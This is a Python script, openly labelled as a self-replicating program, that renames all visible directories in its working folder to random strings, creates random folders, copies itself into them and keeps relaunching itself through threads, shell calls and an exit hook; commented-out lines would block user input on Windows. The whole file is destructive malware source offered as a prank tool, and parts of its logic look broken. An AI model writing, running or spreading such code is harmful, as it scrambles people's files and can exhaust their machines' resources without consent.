'''
<DISCLAIMER>
THIS CODE REPLICATES ITSELF AND WILL CREATE NEW DIRECTORIES
PLEASE MIND THAT THIS WOULD FUCK UP YOUR DIRECTORIES, INCLUDING FILES AND FOLDERS
***DO NOT RUN THIS FILE IN ANY IMPORTANT DIRECTORIES***

self-replicating python file - Replicada by archisha69
'''

import os, shutil, random, string, sys, atexit, threading
#from ctypes import windll

def _atexit():
    os.execv(sys.argv[0], sys.argv)

def subrun():
    os.system(f"python {sys.argv[0]}")

def cp(dest):
    shutil.copy(f"{cwd}/{sys.argv[0]}", dest)

def crossdir():
    while count < 8: #layers
        subrun()
        for qwerty in os.listdir(name):
            cp(qwerty)
            os.chdir(qwerty)
            subrun()
    
atexit.register(_atexit)
    
cwd = os.getcwd()

count = 0

while count < 100:
#while True:
    #for i in range(150):
    #    keyboard.block_key(i)
    #windll.user32.BlockInput(True) #fuck wi
    name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 32)))
    for i in os.listdir(cwd):
        name2 = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 32)))
        if i.startswith(".") or not os.path.isdir(i): pass
        else: os.rename(i, name2)
    os.mkdir(name)
    os.chdir(name)
    shutil.copy(f"../{sys.argv[0]}", os.getcwd())
    t = threading.Thread(target=crossdir)
    t.start()
    os.chdir(cwd)
    count += 1
    
